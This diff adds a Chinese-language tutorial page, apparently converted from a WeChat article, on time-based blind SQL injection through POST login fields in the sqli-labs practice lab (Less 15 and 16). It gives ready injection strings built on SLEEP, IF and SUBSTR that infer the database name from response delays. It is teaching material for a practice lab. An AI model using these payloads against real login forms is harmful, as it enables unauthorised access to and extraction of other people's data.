@@ -1,0 +1,15 @@
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.1//EN"
+  "http://www.w3.org/TR/xhtml11/DTD/xhtml11.dtd">
+
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<title>小课堂 -- 延时布尔盲注(Post)</title>
+<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
+</head>
+<body>
+<h1>小课堂 -- 延时布尔盲注(Post)</h1>
+<blockquote>原文：<a href="http://mp.weixin.qq.com/s?__biz=MzI4MDQ5MjY1Mg==&amp;mid=2247483778&amp;idx=2&amp;sn=dd1074ef7d116cfc62ce9ede59ff3184&amp;chksm=ebb6ee81dcc167974a16feac01fba2324e290d3f978928552bf626968e1f8bad3b058e01c472&amp;scene=126&amp;sessionid=1681670311#rd">http://mp.weixin.qq.com/s?__biz=MzI4MDQ5MjY1Mg==&amp;mid=2247483778&amp;idx=2&amp;sn=dd1074ef7d116cfc62ce9ede59ff3184&amp;chksm=ebb6ee81dcc167974a16feac01fba2324e290d3f978928552bf626968e1f8bad3b058e01c472&amp;scene=126&amp;sessionid=1681670311#rd</a></blockquote><p><span style="font-size: 18px;">环境sqli-labs</span></p><p><span style="font-size: 18px;"><br/></span></p><p><span style="font-size: 18px;">less 15</span></p><p><span style="font-size: 18px;">1、首先我们抓包</span></p><p><img data-ratio="0.6666666666666666" data-type="png" data-src="https://mmbiz.qpic.cn/mmbiz_png/8H1dCzib3UibsAQzmxmLNsxTHAESLLicDveFZOE2eKUia5OLcd41Uewuxa1IWDnlO0ysEZCjB9OrOOFTHjzeFfROjQ/640?wx_fmt=png" src="../Images/f26970d0f387ca5ecca87cf938991a00.png" data-original-src="https://mmbiz.qpic.cn/mmbiz_png/8H1dCzib3UibsAQzmxmLNsxTHAESLLicDveFZOE2eKUia5OLcd41Uewuxa1IWDnlO0ysEZCjB9OrOOFTHjzeFfROjQ/640?wx_fmt=png"/></p><p><br/></p><p><span style="font-size: 18px;">2、测试注入</span></p><p><span style="font-size: 18px;">在 username 输入 1' or 1=1#</span></p><p><span style="font-size: 18px;">在 password 输入 任意</span></p><p><span style="font-size: 18px;">所以用单引号闭合</span></p><p><span style="font-size: 18px;"><br/></span></p><p><span style="font-size: 18px;">3、构造语句</span></p><p><span style="font-size: 18px;">uname=admin'  and  (select (if(length(database())&gt;=8,sleep(5),null)))-- &amp;passwd=2&amp;submit=Submit</span></p><p><span style="font-size: 18px;">如果数据库的长度大于等于8多停留5秒，如果小于8什么都不操作</span></p><p><img data-ratio="0.6666666666666666" data-type="png" data-src="https://mmbiz.qpic.cn/mmbiz_png/8H1dCzib3UibsAQzmxmLNsxTHAESLLicDvekKoYcBMDSmy4Kj3OaVGfVMbzYBXpB5hdX91T8jtafI8kCFcaicJfGjg/640?wx_fmt=png" src="../Images/c34950db1b73ff469dc831dc7a331a40.png" data-original-src="https://mmbiz.qpic.cn/mmbiz_png/8H1dCzib3UibsAQzmxmLNsxTHAESLLicDvekKoYcBMDSmy4Kj3OaVGfVMbzYBXpB5hdX91T8jtafI8kCFcaicJfGjg/640?wx_fmt=png"/></p><p><span style="font-size: 18px;">uname=admin' and If(ascii(substr(database(),1,1))=115,sleep(1),sleep(5))#&amp;passwd=11&amp;submit=Submit</span></p><p><span style="font-size: 18px;">如果第一位是‘s’是多停留1秒，如果不是多停留5秒</span></p><p><span style="font-size: 18px;">uname=admin'and If(left(database(),1)='s',1,sleep(5))#&amp;passwd=11&amp;submit=Submit</span></p><p><span style="font-size: 18px;"><br/></span></p><p><span style="font-size: 18px;">less 16</span></p><p><span style="font-size: 18px;">闭合是双引号和小括号（")），其他都一样</span></p><p><span style="font-size: 18px;"><br/></span></p><p><span style="font-size: 18px;">禁止非法，后果自负</span></p><p/><p><br/></p>
+        
+</body>
+</html>
